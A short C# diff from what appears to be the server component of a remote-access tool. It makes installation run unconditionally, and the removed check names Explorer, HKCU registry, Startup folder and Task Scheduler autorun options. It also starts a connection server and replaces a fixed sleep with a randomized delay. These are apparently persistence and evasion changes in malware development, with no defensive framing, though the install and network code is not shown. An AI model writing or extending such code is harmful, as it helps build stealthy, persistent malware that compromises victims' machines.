@@ -18,30 +18,23 @@ namespace bc.srv
             // todo init st_client
             SrvData.Instance.ServerVersion = "0.2.0";
 
-          
-
             using (var mutex = new Mutex(false, SrvData.Instance.sMutex))
             {
                 if (!mutex.WaitOne(0, false))
                     return;
 
-                // INSTALLAZIONE SERVER
-                if (SrvData.Instance.bUseExplorer || SrvData.Instance.bUseHKCU ||
-                    SrvData.Instance.bUseStartupFolder || SrvData.Instance.UseTaskScheduler)
-                {
-                    var ins = new InstallClass();
-                    ins.StartInstallTHread();
-                }
-                //-----------------------------------------------
-
+                // manage installation
+                var ins = new InstallClass();
+                ins.StartInstallThread();
 
                 // START SERVER
                 var con = new Connection();
                 con.StartServer();
 
+                var randomDelay = new Random(DateTime.Now.Millisecond);
                 while (true)
                 {
-                    Thread.Sleep(2000);
+                    Thread.Sleep(randomDelay.Next(1000,5000));
                 }
             }
 
